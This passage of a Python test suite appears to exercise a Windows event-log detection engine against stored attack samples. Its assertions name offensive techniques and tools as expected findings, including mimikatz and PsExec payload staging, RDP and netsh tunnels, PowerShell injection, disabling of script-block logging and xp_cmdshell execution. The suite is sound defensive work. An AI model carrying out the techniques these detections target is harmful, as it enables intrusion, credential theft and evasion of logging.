        findings = self._run_dataset(SPN_DISCOVERY_SAMPLE, "test-attack-sample-spn-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("SPN Discovery", titles)

    @unittest.skipUnless(AUDIT_POLICY_DISCOVERY_SAMPLE.is_file(), "audit policy discovery sample not available")
    def test_attack_sample_audit_policy_discovery_generates_finding(self):
        findings = self._run_dataset(AUDIT_POLICY_DISCOVERY_SAMPLE, "test-attack-sample-audit-policy-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Audit Policy Discovery", titles)

    @unittest.skipUnless(FIREWALL_DISCOVERY_CMD_SAMPLE.is_file(), "firewall discovery command sample not available")
    def test_attack_sample_firewall_discovery_command_generates_finding(self):
        findings = self._run_dataset(FIREWALL_DISCOVERY_CMD_SAMPLE, "test-attack-sample-firewall-discovery-cmd")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Firewall Configuration Discovery", titles)

    @unittest.skipUnless(FIREWALL_DISCOVERY_POWERSHELL_SAMPLE.is_file(), "firewall discovery PowerShell sample not available")
    def test_attack_sample_firewall_discovery_powershell_generates_finding_without_download_cradle_fp(self):
        findings = self._run_dataset(FIREWALL_DISCOVERY_POWERSHELL_SAMPLE, "test-attack-sample-firewall-discovery-ps")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Firewall Configuration Discovery", titles)
        self.assertNotIn("PowerShell Download Cradle", titles)

    @unittest.skipUnless(SCHEDULED_TASK_DISCOVERY_SAMPLE.is_file(), "scheduled-task discovery sample not available")
    def test_attack_sample_scheduled_task_discovery_generates_finding(self):
        findings = self._run_dataset(SCHEDULED_TASK_DISCOVERY_SAMPLE, "test-attack-sample-scheduled-task-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Scheduled Task Configuration Discovery", titles)

    @unittest.skipUnless(DNS_ZONE_TRANSFER_SAMPLE.is_file(), "DNS zone transfer sample not available")
    def test_attack_sample_dns_zone_transfer_generates_finding(self):
        findings = self._run_dataset(DNS_ZONE_TRANSFER_SAMPLE, "test-attack-sample-dns-zone-transfer")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("DNS Zone Transfer Attempt", titles)

    @unittest.skipUnless(REMOTE_HOSTS_FILE_DISCOVERY_SAMPLE.is_file(), "remote hosts-file discovery sample not available")
    def test_attack_sample_remote_hosts_file_discovery_generates_finding(self):
        findings = self._run_dataset(REMOTE_HOSTS_FILE_DISCOVERY_SAMPLE, "test-attack-sample-remote-hosts-file-discovery")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote Hosts File Discovery"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertIn("10.23.23.9", evidence.get("source_ip", ""))
        self.assertTrue(any("drivers\\etc" in target.lower() or "hosts" in target.lower() for target in evidence.get("relative_targets", [])))

    @unittest.skipUnless(ANONYMOUS_SMB_PROBE_SAMPLE.is_file(), "anonymous SMB probe sample not available")
    def test_attack_sample_anonymous_smb_probe_generates_finding(self):
        findings = self._run_dataset(ANONYMOUS_SMB_PROBE_SAMPLE, "test-attack-sample-anonymous-smb-probe")
        finding = next((item for item in findings["findings"] if item.get("title") == "Anonymous SMB Service Probe"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("source_ip"), "10.23.123.11")
        self.assertTrue(evidence.get("anonymous_present"))
        self.assertGreaterEqual(int(evidence.get("event_count", 0)), 5)

    @unittest.skipUnless(PSLOGGEDON_DISCOVERY_SAMPLE.is_file(), "psloggedon discovery sample not available")
    def test_attack_sample_psloggedon_generates_remote_rpc_discovery(self):
        findings = self._run_dataset(PSLOGGEDON_DISCOVERY_SAMPLE, "test-attack-sample-psloggedon-discovery")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote RPC Discovery"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("source_ip"), "10.0.2.17")
        self.assertTrue({"winreg", "lsarpc", "srvsvc"}.issubset({item.lower() for item in evidence.get("rpc_targets", [])}))

    @unittest.skipUnless(BLOODHOUND_DISCOVERY_SAMPLE.is_file(), "bloodhound discovery sample not available")
    def test_attack_sample_bloodhound_generates_remote_rpc_discovery(self):
        findings = self._run_dataset(BLOODHOUND_DISCOVERY_SAMPLE, "test-attack-sample-bloodhound-discovery")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote RPC Discovery"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("source_ip"), "10.0.2.17")
        self.assertTrue({"samr", "lsarpc", "srvsvc"}.issubset({item.lower() for item in evidence.get("rpc_targets", [])}))

    @unittest.skipUnless(LOCAL_USER_GROUP_DISCOVERY_SAMPLE.is_file(), "local user/group discovery sample not available")
    def test_attack_sample_local_user_and_group_enumeration_generates_findings(self):
        findings = self._run_dataset(LOCAL_USER_GROUP_DISCOVERY_SAMPLE, "test-attack-sample-local-user-group-discovery")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Local Account Enumeration", titles)
        self.assertIn("Local Group Enumeration", titles)

    @unittest.skipUnless(NEW_SMB_SHARE_SAMPLE.is_file(), "new SMB share sample not available")
    def test_attack_sample_new_smb_share_generates_finding_and_incident(self):
        findings = self._run_dataset(NEW_SMB_SHARE_SAMPLE, "test-attack-sample-new-smb-share")
        finding = next((item for item in findings["findings"] if item.get("title") == "New SMB Share Added"), None)
        self.assertIsNotNone(finding)
        self.assertIn("staging", (finding.get("evidence", {}).get("share_name", "") or "").lower())
        incident_types = {item.get("incident_type") for item in findings.get("incidents", [])}
        self.assertIn("new_smb_share_added", incident_types)

    @unittest.skipUnless(REMOTE_SVCCTL_PIPE_SAMPLE.is_file(), "remote svcctl pipe sample not available")
    def test_attack_sample_remote_svcctl_pipe_generates_finding(self):
        findings = self._run_dataset(REMOTE_SVCCTL_PIPE_SAMPLE, "test-attack-sample-remote-svcctl-pipe")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote Service Control Pipe Access"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("source_ip"), "10.0.2.17")
        self.assertIn("svcctl", [item.lower() for item in evidence.get("relative_target_names", [])])

    @unittest.skipUnless(REMCOM_PIPE_SAMPLE.is_file(), "remcom target sample not available")
    def test_attack_sample_remcom_pipe_and_payload_staging_generate_findings(self):
        findings = self._run_dataset(REMCOM_PIPE_SAMPLE, "test-attack-sample-remcom-pipe")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Remote Service Control Pipe Access", titles)
        self.assertIn("Remote Service Payload Staging", titles)

        payload = next((item for item in findings["findings"] if item.get("title") == "Remote Service Payload Staging"), None)
        self.assertIsNotNone(payload)
        staged_paths = [item.lower() for item in payload.get("evidence", {}).get("staged_paths", [])]
        self.assertTrue(any("remcomsvc.exe" in path for path in staged_paths))

    @unittest.skipUnless(SPOOLESS_PIPE_SAMPLE.is_file(), "spoolss pipe sample not available")
    def test_attack_sample_spoolss_pipe_generates_finding(self):
        findings = self._run_dataset(SPOOLESS_PIPE_SAMPLE, "test-attack-sample-spoolss-pipe")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote Print Spooler Pipe Access"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("source_ip"), "10.0.2.17")
        self.assertIn("spoolss", (evidence.get("relative_target_name", "") or "").lower())

    @unittest.skipUnless(RENAMED_PSEXEC_PIPE_SAMPLE.is_file(), "renamed psexec pipe sample not available")
    def test_attack_sample_renamed_psexec_pipe_and_payload_staging_generate_findings(self):
        findings = self._run_dataset(RENAMED_PSEXEC_PIPE_SAMPLE, "test-attack-sample-renamed-psexec-pipe")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("Remote Service Control Pipe Access", titles)
        self.assertIn("Remote Service Payload Staging", titles)

    @unittest.skipUnless(REMOTE_FILE_COPY_SAMPLE.is_file(), "remote file copy sample not available")
    def test_attack_sample_remote_file_copy_surfaces_suspicious_staging_paths(self):
        findings = self._run_dataset(REMOTE_FILE_COPY_SAMPLE, "test-attack-sample-remote-file-copy")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote Service Payload Staging"), None)
        self.assertIsNotNone(finding)
        staged_paths = [item.lower() for item in finding.get("evidence", {}).get("staged_paths", [])]
        self.assertTrue(any("wodcmdterm.exe" in path or "swdrm.dll" in path or "malwr.exe" in path for path in staged_paths))
        self.assertTrue(any("mimikatz" in path or "startup" in path for path in staged_paths))
        incident_types = {item.get("incident_type") for item in findings.get("incidents", [])}
        self.assertIn("remote_service_payload_staging", incident_types)

    @unittest.skipUnless(REMOTE_FILE_WRITE_SYSMON_SAMPLE.is_file(), "remote file write sysmon sample not available")
    def test_attack_sample_remote_file_write_generates_psexec_service_binary_drop(self):
        findings = self._run_dataset(REMOTE_FILE_WRITE_SYSMON_SAMPLE, "test-attack-sample-remote-file-write")
        finding = next((item for item in findings["findings"] if item.get("title") == "PsExec Service Binary Drop"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertTrue(any("psexesvc.exe" in item.lower() for item in evidence.get("target_filenames", [])))
        self.assertTrue(any("services.exe" in item.lower() for item in evidence.get("parent_processes", [])))
        incident_types = {item.get("incident_type") for item in findings.get("incidents", [])}
        self.assertIn("psexec_service_binary_drop", incident_types)

    @unittest.skipUnless(PLINK_RDP_TUNNEL_SAMPLE.is_file(), "plink RDP tunnel sample not available")
    def test_attack_sample_plink_rdp_tunnel_generates_finding(self):
        findings = self._run_dataset(PLINK_RDP_TUNNEL_SAMPLE, "test-attack-sample-plink-rdp-tunnel")
        finding = next((item for item in findings["findings"] if item.get("title") == "Plink RDP Tunnel"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("destination_port"), "80")
        self.assertEqual(evidence.get("loopback_logon_type"), "11")

    @unittest.skipUnless(SYSMON_RDP_TUNNEL_SAMPLE.is_file(), "sysmon RDP tunnel sample not available")
    def test_attack_sample_sysmon_rdp_tunnel_generates_finding(self):
        findings = self._run_dataset(SYSMON_RDP_TUNNEL_SAMPLE, "test-attack-sample-sysmon-rdp-tunnel")
        finding = next((item for item in findings["findings"] if item.get("title") == "RDP Tunnel via Loopback"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("destination_port"), "3389")
        self.assertIn("127.0.0.1", [item for item in evidence.get("source_ips", [])])

    @unittest.skipUnless(IIS_TUNNEL_SAMPLE.is_file(), "IIS tunnel sample not available")
    def test_attack_sample_iis_rdp_and_smb_tunnels_generate_findings(self):
        findings = self._run_dataset(IIS_TUNNEL_SAMPLE, "test-attack-sample-iis-tunnel")
        titles = {item.get("title") for item in findings["findings"]}
        self.assertIn("RDP Tunnel via Loopback", titles)
        self.assertIn("SMB Tunnel via Loopback", titles)

    @unittest.skipUnless(RDP_AUTH_1149_SAMPLE.is_file(), "RDP 1149 sample not available")
    def test_attack_sample_rdp_1149_generates_repeated_rdp_authentication_finding(self):
        findings = self._run_dataset(RDP_AUTH_1149_SAMPLE, "test-attack-sample-rdp-1149")
        finding = next((item for item in findings["findings"] if item.get("title") == "Repeated RDP Authentication Accepted"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertGreaterEqual(int(evidence.get("auth_count", 0)), 2)
        self.assertIn(evidence.get("source_ip"), {"10.0.2.15", "10.0.2.16"})

    @unittest.skipUnless(RDP_LOOPBACK_4624_SAMPLE.is_file(), "RDP loopback 4624 sample not available")
    def test_attack_sample_rdp_4624_loopback_generates_finding(self):
        findings = self._run_dataset(RDP_LOOPBACK_4624_SAMPLE, "test-attack-sample-rdp-loopback-4624")
        finding = next((item for item in findings["findings"] if item.get("title") == "RDP Logon via Loopback"), None)
        self.assertIsNotNone(finding)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("source_ip"), "127.0.0.1")
        self.assertEqual(evidence.get("logon_type"), "10")

    @unittest.skipUnless(NETSH_PORTPROXY_RDP_SAMPLE.is_file(), "netsh portproxy RDP sample not available")
    def test_attack_sample_netsh_portproxy_rdp_generates_finding_and_incident(self):
        findings = self._run_dataset(NETSH_PORTPROXY_RDP_SAMPLE, "test-attack-sample-netsh-portproxy-rdp")
        finding = next((item for item in findings["findings"] if item.get("title") == "Netsh PortProxy RDP Tunnel"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "netsh_portproxy_rdp_tunnel"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("connect_port"), "3389")
        self.assertEqual(evidence.get("listen_address"), "1.2.3.4")

    @unittest.skipUnless(UNMANAGED_POWERSHELL_PSINJECT_SAMPLE.is_file(), "unmanaged PowerShell injection sample not available")
    def test_attack_sample_unmanaged_powershell_injection_generates_finding_and_incident(self):
        findings = self._run_dataset(UNMANAGED_POWERSHELL_PSINJECT_SAMPLE, "test-attack-sample-unmanaged-powershell-injection")
        finding = next((item for item in findings["findings"] if item.get("title") == "Unmanaged PowerShell Injection"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "unmanaged_powershell_injection"), None)
        signal_titles = {item.get("title") for item in findings["findings"]}

        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertNotIn("Remote Thread Injection", signal_titles)
        self.assertEqual((finding.get("evidence", {}) or {}).get("target_image"), r"C:\Windows\System32\notepad.exe")
        self.assertGreaterEqual((finding.get("evidence", {}) or {}).get("remote_thread_count", 0), 3)

    @unittest.skipUnless(RUNDLL32_WERMGR_HOLLOWING_SAMPLE.is_file(), "rundll32 wermgr hollowing sample not available")
    def test_attack_sample_rundll32_wermgr_hollowing_generates_finding_and_incident(self):
        findings = self._run_dataset(RUNDLL32_WERMGR_HOLLOWING_SAMPLE, "test-attack-sample-rundll32-wermgr-hollowing")
        finding = next((item for item in findings["findings"] if item.get("title") == "Rundll32 Wermgr Hollowing"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "rundll32_wermgr_hollowing"), None)

        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}) or {}).get("payload_path"), r"c:\temp\winfire.dll")
        self.assertIn(
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections",
            (finding.get("evidence", {}) or {}).get("registry_targets", []),
        )

    @unittest.skipUnless(CLM_DISABLED_SAMPLE.is_file(), "CLM disabled sample not available")
    def test_attack_sample_clm_disabled_generates_finding_and_incident(self):
        findings = self._run_dataset(CLM_DISABLED_SAMPLE, "test-attack-sample-clm-disabled")
        finding = next((item for item in findings["findings"] if item.get("title") == "PowerShell Constrained Language Mode Disabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "powershell_clm_disabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("__pslockdownpolicy", (finding.get("evidence", {}).get("registry_key", "") or "").lower())

    @unittest.skipUnless(SCRIPTBLOCKLOGGING_DISABLED_SAMPLE.is_file(), "ScriptBlockLogging disabled sample not available")
    def test_attack_sample_scriptblocklogging_disabled_generates_finding_and_incident(self):
        findings = self._run_dataset(SCRIPTBLOCKLOGGING_DISABLED_SAMPLE, "test-attack-sample-scriptblocklogging-disabled")
        finding = next((item for item in findings["findings"] if item.get("title") == "PowerShell ScriptBlockLogging Disabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "powershell_scriptblocklogging_disabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        evidence = finding.get("evidence", {})
        self.assertGreaterEqual(int(evidence.get("collapsed_event_count", 0)), 2)
        self.assertIn("deletevalue", [item.lower() for item in evidence.get("actions", [])])

    @unittest.skipUnless(EXEC_POLICY_CHANGED_SAMPLE.is_file(), "PowerShell execution-policy changed sample not available")
    def test_attack_sample_execution_policy_changed_generates_finding_and_incident(self):
        findings = self._run_dataset(EXEC_POLICY_CHANGED_SAMPLE, "test-attack-sample-execution-policy-changed")
        finding = next((item for item in findings["findings"] if item.get("title") == "PowerShell Execution Policy Weakened"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "powershell_execution_policy_weakened"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        evidence = finding.get("evidence", {})
        self.assertIn("executionpolicy", (evidence.get("registry_key", "") or "").lower())
        self.assertIn("unrestricted", (evidence.get("policy_value", "") or "").lower())

    @unittest.skipUnless(WINDOWS_DEFENDER_EVENTS_SAMPLE.is_file(), "Windows Defender 1116/1117 sample not available")
    def test_attack_sample_windows_defender_events_generate_finding_and_incident(self):
        findings = self._run_dataset(WINDOWS_DEFENDER_EVENTS_SAMPLE, "test-attack-sample-windows-defender-events")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Defender Malware Detection"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "windows_defender_malware_detection"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        evidence = finding.get("evidence", {})
        self.assertGreaterEqual(int(evidence.get("detection_count", 0)), 1)
        self.assertTrue(any("trojan" in item.lower() or "backdoor" in item.lower() for item in evidence.get("threat_names", [])))

    @unittest.skipUnless(KRBRELAYUP_LOOPBACK_SAMPLE.is_file(), "KrbRelayUp loopback sample not available")
    def test_attack_sample_krbrelayup_loopback_generates_finding_and_incident(self):
        findings = self._run_dataset(KRBRELAYUP_LOOPBACK_SAMPLE, "test-attack-sample-krbrelayup-loopback")
        finding = next((item for item in findings["findings"] if item.get("title") == "Kerberos Loopback Administrator Logon"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "kerberos_loopback_admin_logon"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("logon_type"), "3")
        self.assertIn((evidence.get("source_ip", "") or "").lower(), {"127.0.0.1", "::1"})
        self.assertIn("kerberos", (evidence.get("authentication_package", "") or "").lower())
        self.assertIn("administrator", (evidence.get("target_user", "") or "").lower())

    @unittest.skipUnless(EVENTLOG_CRASH_SAMPLE.is_file(), "Event Log crash sample not available")
    def test_attack_sample_eventlog_crash_generates_finding_and_incident(self):
        findings = self._run_dataset(EVENTLOG_CRASH_SAMPLE, "test-attack-sample-eventlog-crash")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Event Log Service Crash"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "event_log_service_crash"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("-s EventLog".lower(), (finding.get("evidence", {}).get("parent_command_line", "") or "").lower())

    @unittest.skipUnless(REMOTE_EVENTLOG_CRASH_SAMPLE.is_file(), "remote Event Log crash sample not available")
    def test_attack_sample_remote_eventlog_crash_generates_finding_and_incident(self):
        findings = self._run_dataset(REMOTE_EVENTLOG_CRASH_SAMPLE, "test-attack-sample-remote-eventlog-crash")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote Event Log Service Crash"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "remote_event_log_service_crash"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("172.16.66.37", finding.get("evidence", {}).get("source_ips", []))

    @unittest.skipUnless(EVENTLOG_7036_SAMPLE.is_file(), "7036 Event Log crash sample not available")
    def test_attack_sample_7036_eventlog_service_transitions_remain_quiet(self):
        findings = self._run_dataset(EVENTLOG_7036_SAMPLE, "test-attack-sample-eventlog-7036-quiet")
        self.assertEqual(findings["summary"]["signal_count"], 0)
        self.assertEqual(findings["summary"]["finding_count"], 0)
        self.assertEqual(findings["summary"]["incident_count"], 0)

    @unittest.skipUnless(DCOM_FAILED_10016_SAMPLE.is_file(), "DCOM 10016 failed-trace sample not available")
    def test_attack_sample_dcom_failed_10016_remains_quiet(self):
        findings = self._run_dataset(DCOM_FAILED_10016_SAMPLE, "test-attack-sample-dcom-failed-10016-quiet")
        self.assertEqual(findings["summary"]["signal_count"], 0)
        self.assertEqual(findings["summary"]["finding_count"], 0)
        self.assertEqual(findings["summary"]["incident_count"], 0)

    @unittest.skipUnless(DFIR_RDPSHARP_168_SAMPLE.is_file(), "DFIR RdpCoreTs 168/68/131 sample not available")
    def test_attack_sample_dfir_rdpsharp_168_remains_quiet(self):
        findings = self._run_dataset(DFIR_RDPSHARP_168_SAMPLE, "test-attack-sample-dfir-rdpsharp-168-quiet")
        self.assertEqual(findings["summary"]["signal_count"], 0)
        self.assertEqual(findings["summary"]["finding_count"], 0)
        self.assertEqual(findings["summary"]["incident_count"], 0)

    @unittest.skipUnless(WINRM_POORLOG_SAMPLE.is_file(), "WinRM poor-log sample not available")
    def test_attack_sample_winrm_poorlog_remains_quiet(self):
        findings = self._run_dataset(WINRM_POORLOG_SAMPLE, "test-attack-sample-winrm-poorlog-quiet")
        self.assertEqual(findings["summary"]["signal_count"], 0)
        self.assertEqual(findings["summary"]["finding_count"], 0)
        self.assertEqual(findings["summary"]["incident_count"], 0)

    @unittest.skipUnless(XPCMDSHELL_ENABLED_SAMPLE.is_file(), "xp_cmdshell enabled sample not available")
    def test_attack_sample_xp_cmdshell_enabled_generates_finding_and_incident(self):
        findings = self._run_dataset(XPCMDSHELL_ENABLED_SAMPLE, "test-attack-sample-xp-cmdshell-enabled")
        finding = next((item for item in findings["findings"] if item.get("title") == "xp_cmdshell Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mssql_xp_cmdshell_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("option_name"), "xp_cmdshell")
        self.assertEqual(evidence.get("old_value"), "0")
        self.assertEqual(evidence.get("new_value"), "1")

    @unittest.skipUnless(XPCMDSHELL_EVENTS_SAMPLE.is_file(), "xp_cmdshell execution sample not available")
    def test_attack_sample_xp_cmdshell_execution_generates_finding_and_incident(self):
        findings = self._run_dataset(XPCMDSHELL_EVENTS_SAMPLE, "test-attack-sample-xp-cmdshell-execution")
        finding = next((item for item in findings["findings"] if item.get("title") == "MSSQL xp_cmdshell Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mssql_xp_cmdshell_execution"), None)
        enabled = next((item for item in findings["findings"] if item.get("title") == "xp_cmdshell Enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIsNotNone(enabled)
        evidence = finding.get("evidence", {})
        self.assertEqual(evidence.get("client_ip"), "10.0.2.17")
        self.assertEqual(finding.get("user_display"), "root")
        self.assertIn("xp_cmdshell", (evidence.get("statement", "") or "").lower())

    @unittest.skipUnless(XPCMDSHELL_EVENTS_SBOUSSEADEN_SAMPLE.is_file(), "sbousseaden xp_cmdshell execution sample not available")
    def test_attack_sample_xp_cmdshell_execution_sbousseaden_generates_finding_and_incident(self):
        findings = self._run_dataset(XPCMDSHELL_EVENTS_SBOUSSEADEN_SAMPLE, "test-attack-sample-xp-cmdshell-execution-sbousseaden")
        finding = next((item for item in findings["findings"] if item.get("title") == "MSSQL xp_cmdshell Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mssql_xp_cmdshell_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("xp_cmdshell", (finding.get("evidence", {}).get("statement", "") or "").lower())

    @unittest.skipUnless(XPCMDSHELL_ATTEMPT_SAMPLE.is_file(), "xp_cmdshell failed-attempt sample not available")
    def test_attack_sample_xp_cmdshell_attempt_generates_finding_and_incident(self):
        findings = self._run_dataset(XPCMDSHELL_ATTEMPT_SAMPLE, "test-attack-sample-xp-cmdshell-attempt")
        finding = next((item for item in findings["findings"] if item.get("title") == "MSSQL xp_cmdshell Execution Attempt"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mssql_xp_cmdshell_execution_attempt"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("xp_cmdshell", (finding.get("evidence", {}).get("raw_payload", "") or "").lower())

    @unittest.skipUnless(XPCMDSHELL_ATTEMPT_SBOUSSEADEN_SAMPLE.is_file(), "sbousseaden xp_cmdshell failed-attempt sample not available")
    def test_attack_sample_xp_cmdshell_attempt_sbousseaden_generates_finding_and_incident(self):
        findings = self._run_dataset(XPCMDSHELL_ATTEMPT_SBOUSSEADEN_SAMPLE, "test-attack-sample-xp-cmdshell-attempt-sbousseaden")
        finding = next((item for item in findings["findings"] if item.get("title") == "MSSQL xp_cmdshell Execution Attempt"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mssql_xp_cmdshell_execution_attempt"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("xp_cmdshell", (finding.get("evidence", {}).get("raw_payload", "") or "").lower())

if __name__ == "__main__":
    unittest.main()
